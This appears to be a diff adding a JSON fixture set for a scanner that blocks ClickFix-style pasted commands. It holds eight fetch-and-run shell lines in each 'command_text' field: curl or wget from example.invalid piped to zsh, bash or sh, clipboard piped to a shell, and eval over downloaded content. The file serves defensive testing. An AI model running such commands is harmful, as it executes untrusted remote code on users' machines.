@@ -1,0 +1,237 @@
+[
+  {
+    "fixture_id": "CF-SIMPLE-001",
+    "name": "Network retrieval piped to zsh",
+    "category": "simple",
+    "description": "Network retrieval piped to zsh supplied only as inert scanner data.",
+    "command_text": "curl -fsSL https://example.invalid/update | zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-SIMPLE-002",
+    "name": "Network retrieval piped to Bash",
+    "category": "simple",
+    "description": "Network retrieval piped to Bash supplied only as inert scanner data.",
+    "command_text": "curl -fsSL https://example.invalid/fix | bash",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "bash",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-SIMPLE-003",
+    "name": "Downloader piped to sh",
+    "category": "simple",
+    "description": "Downloader piped to sh supplied only as inert scanner data.",
+    "command_text": "wget -qO- https://example.invalid/install | sh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "sh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-SIMPLE-004",
+    "name": "Download followed by shell execution",
+    "category": "simple",
+    "description": "Download followed by shell execution supplied only as inert scanner data.",
+    "command_text": "curl -fsSL https://example.invalid/fix -o /tmp/msaa-test.sh ; zsh /tmp/msaa-test.sh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "download_stage_execute"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-SIMPLE-005",
+    "name": "Clipboard piped to shell",
+    "category": "simple",
+    "description": "Clipboard piped to shell supplied only as inert scanner data.",
+    "command_text": "pbpaste | zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "clipboard_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-SIMPLE-006",
+    "name": "Clipboard executed with shell -c",
+    "category": "simple",
+    "description": "Clipboard executed with shell -c supplied only as inert scanner data.",
+    "command_text": "zsh -c \"$(pbpaste)\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "clipboard_to_interpreter",
+      "command_substitution"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-SIMPLE-007",
+    "name": "Network content executed by shell -c",
+    "category": "simple",
+    "description": "Network content executed by shell -c supplied only as inert scanner data.",
+    "command_text": "zsh -c \"$(curl -fsSL https://example.invalid/fix)\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter",
+      "shell_c_execution"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-SIMPLE-008",
+    "name": "Network retrieval passed to eval",
+    "category": "simple",
+    "description": "Network retrieval passed to eval supplied only as inert scanner data.",
+    "command_text": "eval \"$(curl -fsSL https://example.invalid/fix)\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_eval",
+      "dynamic_execution"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  }
+]
